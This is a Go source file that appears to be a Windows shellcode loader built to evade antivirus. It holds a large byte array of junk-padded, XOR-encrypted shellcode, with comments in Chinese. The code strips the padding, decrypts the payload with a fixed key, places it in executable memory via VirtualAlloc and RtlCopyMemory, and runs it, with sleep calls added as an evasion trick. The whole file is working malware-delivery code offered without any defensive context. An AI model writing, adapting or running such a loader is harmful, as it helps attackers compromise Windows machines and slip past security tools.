package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。

)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	mix_shellcode := []byte{0x95,0x69,0x39,0x71,0xe6,0x65,0x8d,0x69,0x81,0x71,0x8d,0x65,0xa1,0x69,0x71,0x71,0x65,0x65,0x69,0x69,0x30,0x71,0x34,0x65,0x28,0x69,0x21,0x71,0x37,0x65,0x38,0x69,0x27,0x71,0x2d,0x65,0x58,0x69,0xa3,0x71,0x0,0x65,0x21,0x69,0xfa,0x71,0x37,0x65,0x9,0x69,0x39,0x71,0xee,0x65,0x3b,0x69,0x69,0x71,0x2d,0x65,0xe2,0x69,0x23,0x71,0x45,0x65,0x21,0x69,0xfa,0x71,0x17,0x65,0x39,0x69,0x39,0x71,0x6a,0x65,0xde,0x69,0x3b,0x71,0x2f,0x65,0x24,0x69,0x40,0x71,0xac,0x65,0x21,0x69,0x40,0x71,0xa5,0x65,0xc5,0x69,0x4d,0x71,0x4,0x65,0x15,0x69,0x73,0x71,0x49,0x65,0x49,0x69,0x30,0x71,0xa4,0x65,0xa0,0x69,0x7c,0x71,0x24,0x65,0x68,0x69,0xb0,0x71,0x87,0x65,0x84,0x69,0x23,0x71,0x24,0x65,0x38,0x69,0x39,0x71,0xee,0x65,0x3b,0x69,0x51,0x71,0xee,0x65,0x2b,0x69,0x4d,0x71,0x2d,0x65,0x68,0x69,0xa1,0x71,0x3,0x65,0xe8,0x69,0x9,0x71,0x7d,0x65,0x62,0x69,0x73,0x71,0x10,0x65,0x1b,0x69,0xfa,0x71,0xe5,0x65,0xe1,0x69,0x71,0x71,0x65,0x65,0x69,0x69,0x39,0x71,0xe0,0x65,0xa9,0x69,0x5,0x71,0x2,0x65,0x21,0x69,0x70,0x71,0xb5,0x65,0x39,0x69,0xfa,0x71,0x2d,0x65,0x71,0x69,0x35,0x71,0xee,0x65,0x29,0x69,0x51,0x71,0x2c,0x65,0x68,0x69,0xa1,0x71,0x86,0x65,0x3f,0x69,0x39,0x71,0x9a,0x65,0xa0,0x69,0x30,0x71,0xee,0x65,0x5d,0x69,0xf9,0x71,0x2d,0x65,0x68,0x69,0xa7,0x71,0x28,0x65,0x58,0x69,0xb8,0x71,0x2d,0x65,0x58,0x69,0xb1,0x71,0xc9,0x65,0x28,0x69,0xb0,0x71,0xac,0x65,0x64,0x69,0x30,0x71,0x64,0x65,0xa8,0x69,0x49,0x71,0x85,0x65,0x1c,0x69,0x80,0x71,0x29,0x65,0x6a,0x69,0x3d,0x71,0x41,0x65,0x61,0x69,0x34,0x71,0x5c,0x65,0xb8,0x69,0x4,0x71,0xbd,0x65,0x31,0x69,0x35,0x71,0xee,0x65,0x29,0x69,0x55,0x71,0x2c,0x65,0x68,0x69,0xa1,0x71,0x3,0x65,0x28,0x69,0xfa,0x71,0x69,0x65,0x21,0x69,0x35,0x71,0xee,0x65,0x29,0x69,0x6d,0x71,0x2c,0x65,0x68,0x69,0xa1,0x71,0x24,0x65,0xe2,0x69,0x75,0x71,0xed,0x65,0x21,0x69,0x70,0x71,0xb5,0x65,0x28,0x69,0x29,0x71,0x24,0x65,0x31,0x69,0x2f,0x71,0x3c,0x65,0x33,0x69,0x30,0x71,0x3d,0x65,0x28,0x69,0x28,0x71,0x24,0x65,0x33,0x69,0x39,0x71,0xe6,0x65,0x85,0x69,0x51,0x71,0x24,0x65,0x3b,0x69,0x8e,0x71,0x85,0x65,0x31,0x69,0x30,0x71,0x3c,0x65,0x33,0x69,0x39,0x71,0xee,0x65,0x7b,0x69,0x98,0x71,0x2a,0x65,0x96,0x69,0x8e,0x71,0x9a,0x65,0x34,0x69,0x1b,0x71,0x65,0x65,0x20,0x69,0xcf,0x71,0x12,0x65,0x0,0x69,0x1f,0x71,0xc,0x65,0x7,0x69,0x14,0x71,0x11,0x65,0x69,0x69,0x30,0x71,0x33,0x65,0x20,0x69,0xf8,0x71,0x83,0x65,0x25,0x69,0xf8,0x71,0x94,0x65,0x28,0x69,0xcb,0x71,0x29,0x65,0x1e,0x69,0x57,0x71,0x62,0x65,0x96,0x69,0xa4,0x71,0x2d,0x65,0x58,0x69,0xb8,0x71,0x2d,0x65,0x58,0x69,0xa3,0x71,0x28,0x65,0x58,0x69,0xb1,0x71,0x28,0x65,0x58,0x69,0xb8,0x71,0x24,0x65,0x39,0x69,0x30,0x71,0x35,0x65,0x28,0x69,0xcb,0x71,0x5f,0x65,0x3f,0x69,0x8,0x71,0xc2,0x65,0x96,0x69,0xa4,0x71,0x8e,0x65,0x1a,0x69,0x2b,0x71,0x2d,0x65,0xe0,0x69,0xb0,0x71,0x24,0x65,0xd1,0x69,0x8f,0x71,0x9a,0x65,0x69,0x69,0x71,0x71,0x28,0x65,0x58,0x69,0xb8,0x71,0x24,0x65,0x38,0x69,0x30,0x71,0x34,0x65,0x3,0x69,0x72,0x71,0x24,0x65,0x38,0x69,0x30,0x71,0xdf,0x65,0x3e,0x69,0xf8,0x71,0xfa,0x65,0xaf,0x69,0x8e,0x71,0xb0,0x65,0x82,0x69,0x28,0x71,0x3e,0x65,0x21,0x69,0xf8,0x71,0xa4,0x65,0x21,0x69,0x40,0x71,0xb7,0x65,0x20,0x69,0xf8,0x71,0xbd,0x65,0x24,0x69,0x40,0x71,0xac,0x65,0x3b,0x69,0x19,0x71,0x65,0x65,0x6b,0x69,0x31,0x71,0xe1,0x65,0x3b,0x69,0x23,0x71,0x24,0x65,0xd3,0x69,0x9a,0x71,0x30,0x65,0x47,0x69,0x4a,0x71,0x9a,0x65,0xbc,0x69,0x39,0x71,0xec,0x65,0xaf,0x69,0x39,0x71,0xe6,0x65,0xaa,0x69,0x21,0x71,0xf,0x65,0x63,0x69,0x2e,0x71,0x2d,0x65,0xe0,0x69,0x80,0x71,0x2d,0x65,0xe0,0x69,0xab,0x71,0x2c,0x65,0xae,0x69,0xb1,0x71,0x9a,0x65,0x96,0x69,0x8e,0x71,0x9a,0x65,0x24,0x69,0x40,0x71,0xac,0x65,0x3b,0x69,0x23,0x71,0x24,0x65,0xd3,0x69,0x5c,0x71,0x63,0x65,0x71,0x69,0xa,0x71,0x9a,0x65,0xbc,0x69,0xf4,0x71,0xa5,0x65,0x66,0x69,0xf4,0x71,0xf8,0x65,0x68,0x69,0x71,0x71,0x65,0x65,0x21,0x69,0x8e,0x71,0xaa,0x65,0x66,0x69,0xf5,0x71,0xe9,0x65,0x68,0x69,0x71,0x71,0x65,0x65,0x82,0x69,0xa2,0x71,0x8c,0x65,0x8d,0x69,0x70,0x71,0x65,0x65,0x69,0x69,0x99,0x71,0xc7,0x65,0x96,0x69,0x8e,0x71,0x9a,0x65,0x46,0x69,0x3b,0x71,0x11,0x65,0x5c,0x69,0x1b,0x71,0x65,0x65,0x53,0x69,0x89,0x71,0x2c,0x65,0xfc,0x69,0xdd,0x71,0x9f,0x65,0xe1,0x69,0xf6,0x71,0x3d,0x65,0xb7,0x69,0xee,0x71,0xd,0x65,0x11,0x69,0xb3,0x71,0x58,0x65,0xb4,0x69,0x19,0x71,0xf8,0x65,0xda,0x69,0x3d,0x71,0x2e,0x65,0x65,0x69,0x3d,0x71,0x8,0x65,0x9a,0x69,0xa4,0x71,0x4f,0x65,0xae,0x69,0x36,0x71,0xd0,0x65,0x21,0x69,0xf7,0x71,0x71,0x65,0x77,0x69,0x8,0x71,0x6b,0x65,0xab,0x69,0x52,0x71,0x40,0x65,0x45,0x69,0x93,0x71,0x6b,0x65,0x27,0x69,0x23,0x71,0xa3,0x65,0xeb,0x69,0xf1,0x71,0x26,0x65,0x1d,0x69,0x97,0x71,0xbd,0x65,0x3e,0x69,0x70,0x71,0x38,0x65,0xdb,0x69,0x13,0x71,0xf8,0x65,0x6d,0x69,0xee,0x71,0x61,0x65,0xfe,0x69,0x30,0x71,0xd3,0x65,0x13,0x69,0x25,0x71,0xad,0x65,0x48,0x69,0x22,0x71,0x3b,0x65,0x54,0x69,0x3b,0x71,0xc4,0x65,0xbd,0x69,0x71,0x71,0x30,0x65,0x1a,0x69,0x14,0x71,0x17,0x65,0x44,0x69,0x30,0x71,0x2,0x65,0xc,0x69,0x1f,0x71,0x11,0x65,0x53,0x69,0x51,0x71,0x28,0x65,0x6,0x69,0xb,0x71,0xc,0x65,0x5,0x69,0x1d,0x71,0x4,0x65,0x46,0x69,0x45,0x71,0x4b,0x65,0x59,0x69,0x51,0x71,0x4d,0x65,0xa,0x69,0x1e,0x71,0x8,0x65,0x19,0x69,0x10,0x71,0x11,0x65,0x0,0x69,0x13,0x71,0x9,0x65,0xc,0x69,0x4a,0x71,0x45,0x65,0x24,0x69,0x22,0x71,0x2c,0x65,0x2c,0x69,0x51,0x71,0x5d,0x65,0x47,0x69,0x41,0x71,0x5e,0x65,0x49,0x69,0x26,0x71,0xc,0x65,0x7,0x69,0x15,0x71,0xa,0x65,0x1e,0x69,0x2,0x71,0x45,0x65,0x27,0x69,0x25,0x71,0x45,0x65,0x5c,0x69,0x5f,0x71,0x54,0x65,0x52,0x69,0x51,0x71,0x31,0x65,0x1b,0x69,0x18,0x71,0x1,0x65,0xc,0x69,0x1f,0x71,0x11,0x65,0x46,0x69,0x45,0x71,0x4b,0x65,0x59,0x69,0x4a,0x71,0x45,0x65,0x47,0x69,0x3f,0x71,0x20,0x65,0x3d,0x69,0x45,0x71,0x4b,0x65,0x59,0x69,0x32,0x71,0x5e,0x65,0x49,0x69,0x5f,0x71,0x2b,0x65,0x2c,0x69,0x25,0x71,0x51,0x65,0x47,0x69,0x41,0x71,0x20,0x65,0x40,0x69,0x7c,0x71,0x6f,0x65,0x69,0x69,0xee,0x71,0xa9,0x65,0xf1,0x69,0x41,0x71,0x45,0x65,0xed,0x69,0xee,0x71,0xa6,0x65,0x7d,0x69,0xf8,0x71,0x98,0x65,0x10,0x69,0xf8,0x71,0x0,0x65,0x66,0x69,0xe3,0x71,0xee,0x65,0xc3,0x69,0xbf,0x71,0xb9,0x65,0x25,0x69,0x4d,0x71,0x11,0x65,0xef,0x69,0x28,0x71,0x24,0x65,0x73,0x69,0x80,0x71,0xa6,0x65,0xf8,0x69,0xcb,0x71,0xf,0x65,0x92,0x69,0xe7,0x71,0x99,0x65,0x35,0x69,0x84,0x71,0x6f,0x65,0xfd,0x69,0xed,0x71,0xe8,0x65,0x70,0x69,0xe5,0x71,0xb7,0x65,0xdc,0x69,0x95,0x71,0x59,0x65,0xd5,0x69,0xf4,0x71,0x0,0x65,0xc,0x69,0x4d,0x71,0x1a,0x65,0x6e,0x69,0xb6,0x71,0xb7,0x65,0x3a,0x69,0xd7,0x71,0x11,0x65,0x5d,0x69,0xdb,0x71,0x4b,0x65,0x5,0x69,0xd8,0x71,0x2f,0x65,0xf2,0x69,0x40,0x71,0x47,0x65,0x9d,0x69,0x8c,0x71,0xe0,0x65,0xd5,0x69,0x52,0x71,0x37,0x65,0x9f,0x69,0x47,0x71,0xe,0x65,0xb2,0x69,0xb4,0x71,0xd2,0x65,0xe4,0x69,0x44,0x71,0x92,0x65,0x64,0x69,0x55,0x71,0xea,0x65,0xb4,0x69,0xad,0x71,0xed,0x65,0xc2,0x69,0xe0,0x71,0xcd,0x65,0xa,0x69,0x55,0x71,0x54,0x65,0x31,0x69,0x70,0x71,0x70,0x65,0x6e,0x69,0x32,0x71,0x11,0x65,0x29,0x69,0x0,0x71,0x57,0x65,0x19,0x69,0xb6,0x71,0xa,0x65,0x80,0x69,0x66,0x71,0xa5,0x65,0xb7,0x69,0xc3,0x71,0x7c,0x65,0xf,0x69,0x51,0x71,0x63,0x65,0x43,0x69,0x30,0x71,0x24,0x65,0xf8,0x69,0x61,0x71,0x6,0x65,0xcc,0x69,0xcd,0x71,0xd7,0x65,0xfd,0x69,0xf,0x71,0x88,0x65,0xea,0x69,0x99,0x71,0x61,0x65,0x53,0x69,0x5,0x71,0x7a,0x65,0xc7,0x69,0x2e,0x71,0x82,0x65,0x9f,0x69,0x69,0x71,0xcb,0x65,0xed,0x69,0xfd,0x71,0x2f,0x65,0x9f,0x69,0x3f,0x71,0x44,0x65,0x27,0x69,0x3a,0x71,0xfd,0x65,0x15,0x69,0x5e,0x71,0x16,0x65,0x4f,0x69,0xe1,0x71,0x60,0x65,0x76,0x69,0x91,0x71,0xaf,0x65,0x8e,0x69,0x56,0x71,0x76,0x65,0x4a,0x69,0x54,0x71,0x21,0x65,0x3b,0x69,0x5c,0x71,0xab,0x65,0xf,0x69,0xc4,0x71,0x65,0x65,0x19,0x69,0xd3,0x71,0x77,0x65,0x58,0x69,0x93,0x71,0xfe,0x65,0x62,0x69,0xca,0x71,0xe3,0x65,0xf4,0x69,0x53,0x71,0xc8,0x65,0x26,0x69,0x39,0x71,0x15,0x65,0xb3,0x69,0xde,0x71,0x57,0x65,0xe1,0x69,0x6f,0x71,0x65,0x65,0x33,0x69,0xe,0x71,0x83,0x65,0xe6,0x69,0x74,0x71,0x5e,0x65,0x9f,0x69,0xc0,0x71,0x7,0x65,0xe8,0x69,0x54,0x71,0x9d,0x65,0xe7,0x69,0xdf,0x71,0x65,0x65,0x28,0x69,0xcf,0x71,0x95,0x65,0xdc,0x69,0xd3,0x71,0x33,0x65,0x96,0x69,0xa4,0x71,0x2d,0x65,0x58,0x69,0xb8,0x71,0xdf,0x65,0x69,0x69,0x71,0x71,0x25,0x65,0x69,0x69,0x30,0x71,0xdd,0x65,0x69,0x69,0x61,0x71,0x65,0x65,0x69,0x69,0x30,0x71,0xdc,0x65,0x29,0x69,0x71,0x71,0x65,0x65,0x69,0x69,0x30,0x71,0xdf,0x65,0x31,0x69,0xd5,0x71,0x36,0x65,0x8c,0x69,0x8e,0x71,0xb0,0x65,0x21,0x69,0xe2,0x71,0x36,0x65,0x3a,0x69,0x39,0x71,0xec,0x65,0x8e,0x69,0x39,0x71,0xec,0x65,0x98,0x69,0x39,0x71,0xec,0x65,0xb3,0x69,0x30,0x71,0xdd,0x65,0x69,0x69,0x51,0x71,0x65,0x65,0x69,0x69,0x38,0x71,0xec,0x65,0x90,0x69,0x30,0x71,0xdf,0x65,0x7b,0x69,0xe7,0x71,0xec,0x65,0x8b,0x69,0x8e,0x71,0xb0,0x65,0x21,0x69,0xf2,0x71,0xa1,0x65,0x49,0x69,0xf4,0x71,0xa5,0x65,0x1d,0x69,0xc7,0x71,0x3,0x65,0xe2,0x69,0x76,0x71,0x2d,0x65,0x68,0x69,0xb2,0x71,0xe0,0x65,0xa9,0x69,0x4,0x71,0xb2,0x65,0x31,0x69,0x29,0x71,0x3d,0x65,0x21,0x69,0x74,0x71,0x65,0x65,0x69,0x69,0x71,0x71,0x65,0x65,0x39,0x69,0xb2,0x71,0x8d,0x65,0xf6,0x69,0x8c,0x71,0x9a,0x65,0x96,0x69,0x40,0x71,0x54,0x65,0x50,0x69,0x5f,0x71,0x57,0x65,0x5a,0x69,0x5f,0x71,0x54,0x65,0x5e,0x69,0x43,0x71,0x4b,0x65,0x58,0x69,0x46,0x71,0x65,0x65,0x6,0x69,0xdb,0x71,0x34,0x65,0xaa,0x69}
	var ttyolller []byte
	key := []byte("iqe")
	var key_size = len(key)
	var shellcode_final []byte
	var j = 0
	time.Sleep(2)
	// 去除垃圾代码
	fmt.Print(len(mix_shellcode))
	for i := 0; i < len(mix_shellcode); i++ {
		if (i % 2 == 0) {
			shellcode_final = append(shellcode_final,mix_shellcode[i])
			j += 1
		}
	}
	time.Sleep(3)
	fmt.Print(shellcode_final)
	// 解密异或
	for i := 0; i < len(shellcode_final); i++ {
		ttyolller = append(ttyolller, shellcode_final[i]^key[i % key_size])
	}
	time.Sleep(3)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(ttyolller)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(3)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&ttyolller[0])), uintptr(len(ttyolller)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}